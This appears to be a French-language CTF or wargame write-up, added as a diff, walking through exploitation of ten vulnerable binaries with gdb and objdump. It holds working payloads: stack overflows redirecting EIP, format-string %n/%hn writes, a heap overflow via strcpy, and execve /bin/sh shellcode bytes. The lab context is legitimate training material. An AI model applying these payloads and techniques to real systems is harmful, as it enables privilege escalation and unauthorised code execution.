@@ -1,0 +1,62 @@
+1. GDB level0
+disas main
+On remarque que l'input est dans eax et atoi est appele dessus donc on attend un nombre
+Cet argument est compare avec une valeur hexadecimale, on convertie en decimal ce qui donne 423
+On lance level0 avec 423 comme argument et on monte en privilege xoxo
+
+2. On utilise objdump -d sur level1
+On remarque le call a gets ainsi qu'une fonction run qui contient un appel a system. Cette fonction n'est jamais appelee on en deduit que l'exploit consiste a la call.
+On utilise un generateur de buffer overflow pour depasser le buffer de gets via la chaine 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+On recupere un offset "0x63413563 in ?? ()" via la trace de gdb
+On calcule avec un outil l'offset de l'EIP (registre qui contient l'adresse de la prochaine instruction du processeur) qui est de 76
+On genere une chaine de 76 caracteres pour arriver a cet offset et on met l'adresse de la fonction run convertie en little endian 0x44840408 via un script python
+On lance /tmp/exploit.py - | level1
+cd /home/user/level2 && cat .pass
+
+3. On lance le binaire et on se rend compte qu'il duplique ce que l'on ecrit sur l'entree standard.
+Quand on passe une chaine de 75 charactere on voit qu'il n'en affiche que 64 et que les autres caractere affichees varie en fonction des essai (erreur de memoire) = buffer overflow
+On utilise objdump -d sur level2 et on voit que la fonction main appelle la fonction p qui elle meme recupere l'entree, la duplique puis l'affiche.
+On utilise gdb level2 puis une chaine de 100 caractere pour le faire segfault
+On utilise un site web pour calculer l'offset du registre EIP (content l'adresse de la prochaine instruction appellee)
+L'offset est de 80
+On utilise un script python pour generer le payload, celui contient un shellcode permettant de lancer un shell, du bourage et a la fin l'adresse d'un call vers le registre eax contenant l'adresse du buffer contenant lui-meme le shellcode. On utilise le call eax adresse 0x80484cf mais on pourrait utiliser n'importe lequel.
+shellcode trouve sur: https://dhavalkapil.com/blogs/Shellcode-Injection/
+
+4. Buffer[512]
+	ptr = Gets(buffer)
+	*ptr -> -520(ebp)
+- TIPS:
+	ESP = stack point
+	EAX = argv
+	EBP = current iterator of esp
+
+On lance le binaire et on se rend compte qu'il duplique ce que l'on ecrit sur l'entree standard.
+Quand on passe une chaine de 1000 caractere on se rend que le buffer fait 512 characters mais ne segfault pas on ne peut donc pas utiliser le meme exploit que l'exercide precedent.
+En faisant un objdump -d sur level3 on voit que la fonction main appelle la fonction v qui elle meme contient un appel a system. Bingo. Pour recuperer l'entree standard elle utilise (f?)gets puis printf pour l'afficher. Le retour de printf est ensuite stockee dans eax, la valeur sur laquelle pointe d'eax change avant une comparaison et empeche l'appel de system(). On utilise ecrit un payload en python pour changer la valeur contenue a l'adresse  0x804988c pour la mettre a 64. 
+On ecrit donc python -c 'print "\x8C\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload donc l'adresse en little endian puis 60 caracter puis 4 pour remonter dans la stack. Le totale fait 64 ce qui permet grace au $n d'ecrire cette valeur dans l'adresse ($n permettant d'ecrire le nombre de caracteres precedant ce specifier).
+On lance le payload avec cat /tmp/payload - | ./level3
+
+5. En utilisant objdump -d on voit aue main call la fonction n. Cette fonction contient une comparaison avant un call a system. Cette comparaison compare EAX avec une valeur contenue en dure dans la memoire. La valeur d'EAX est set juste avant cette instruction par: mov eax,ds:0x8049810 . On veut donc changer l'adresse 0x8049810 par la valeur de comparaison. 
+On utilise
+for((i=0; i<200; i++)); do echo "Index $i" && echo "AAAAAA%$i\$x" > /tmp/gg && /home/user/level4/level4 < /tmp/gg ; done | grep -B1 4141
+Pour trouver l'offset ou injecter le payload. L'offset est de 12 on utilise donc python pour generer le payload:
+python -c 'print "\x10\x98\x04\x08" + "A" + "%16930111c" + "%12$n"' > /tmp/payload
+Puis /tmp/payload - | ./level4
+
+6. objdump -d on voit la function <o> qui contient un call a system. Dans la fonction <n> on voit un call a printf suivi d'un exit. En utilisant le script de la fonction precedente on voit que l'offset d'attaque est de 4. L'adresse de <o> est 0x080484a4 et celle de exit est 0x80483d0: On voit que la difference n'est que sur les deux derniers octets. On ecrit le payload on convertie 0x84a4 en decimali on obtient 33956 et utilise le modificatuer %h pour modifier que les deux dernier byte de l'adresse de exit:
+
+python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/payload
+
+7. On objdump -d et on voit  une fonction n qui n'est pas appelle dans le main qui contient un call a system. Quand on lance le programme sans argument il segfault. Quand on le lance avec il ecrit nope sur l'entre standard. On utilise un generateur d'offset string pour trouver l'offset d'injection. On tombe sur l'adresse 0x41346341 qui donne un offset de 72 (buffer - adresse du pointeur sur funcion?). On doit donc ecrire 72 A puis l'adresse de la fonction N pour changer la valeur de l'adresse de l'EIP.
+./level6 `python -c 'print "A" * 72 + "\x54\x84\x04\x08"
+
+8. Le programme contient deux STRCPY ainsi que quatres mallocs dont deux chevauchent les precedents sur 4 octets. En affichant le contenue du registre EDX (printf "s", $edx) avant le call du premier strcopy on se rend conpte qu'il copie ARGV[1] dans le second malloc (0x804a018). Il fait la meme chose avc ARGV[2] dans le malloc numero 4. En placant un breakpoint juste avant le fopen on voit qu'il ouvre le fichier /home/user/levl8/.pass. Il lit le contenu du fichier puts("~~"). Si ca segfault pas comme un gros sale si un argument est vide ou si argv[1] a une taille trop grande. En gros on veut overflow pour remplacer le call de puts en call de <m> parce que la fonction susnommee fait un gros call printf des familles et les exercices precedents nous ont appris que si la fonction est pas appellee alors elle fait le cafe. En gros le premier argument se placera sur l'addresse de puts puis debordera sur buffer_2 pour ecrire l'addresse de <m>:
+
+./level7 `python -c "print 'A' * 20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+
+9. On lance le programme avec gdb on disas le main et on trouve l'appelle a system. Il se trouve apres une condition qui check que la valeur du registre corresond a 0x20. Avant on voit une comparaison avec une variable qui vient d'une data section (prefixe ds:). En faisant un objdump -s -j .rodata on dump la section et on voit les chaines auth, reset, service et login. On voit un call a system en 0x080486f5 on remonte au cmp precedent et on voit qu'il fait reference a un data segment. Pour voir le contenu du data segment on met un breakpoint au-dessus avec b* 0x080486c9 on affiche le contenu du registre %esi avec info registers esi et on l'afffiche avec printf "%s", addressofesi. Cela correspond au login vu precedement dans la section .rodata. On voit ensuite un test avec eax et 0x20 (32). On met un breakoint sur la lignede    0x080486e2 <+382>:	mov    0x8049aac,%eax. On affiche eax et recupere l'adresse du pointer. On doit ecrire 0x20 juste ensuite. On utilise printf "%x", *0x8049aac" pour connaitre l'adresse ou faire le padding = 0x0804a008 c'est l'adresse de l'argument de la commande auth. On y ajoute 0x20 pour savoir ou on doit ecrire le garbage. En faisant login on tombe sur 0x804a008, en faisant service t on voit 0x804a018 soit 15 caractere avant. on tente service + 15 character. On utilise login qui test eax (cmp, 0). On passe exo 10.
+
+10. On voit que le code est en C++ en desssemblant avec gdb disas main. On tente de mettre une chaine generer pour faire cracher le programme. Il segfault. On affiche EAX (info register) qui contient une adresse 0x41366441. On sur le site de jason-rush on voitq que cela correspond a un offset de 108. On tente de retrouver notre chaine dans la memoire pour cela n met un breakpoint au-dessus de setAnnotation. Puis on dump eax avec x/50s $eax et on voit qu'a l'adresse 0x804a00c "a" est repete n fois. Juste en dessous on veut modifier le call a EDX pour appeller un shellcode. 	Pour cela on genere un payload	 avec l'adresse de notre chaine + 4 + shellcode + offset (-taille du shellcode) + adresse de notre chaine.
+./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+Bibadaboum.
